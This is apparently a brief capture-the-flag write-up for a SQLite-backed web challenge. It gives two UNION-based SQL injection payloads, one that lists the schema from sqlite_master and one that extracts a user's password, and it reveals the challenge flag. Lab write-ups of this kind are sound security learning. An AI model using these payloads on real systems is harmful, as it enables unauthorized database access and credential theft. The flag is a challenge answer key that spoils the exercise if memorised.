Table using SQLite3 (from source and error message on input `'`)     

Find names of columns with:     
`1 = 2 union select 1,sql from sqlite_master --`     

Leak password by canceling out the first term and unioning with password     
`1 = 2 union select 1,password from users where id=1 --`     

Flag is `WEBSEC{Simple_SQLite_Injection}`
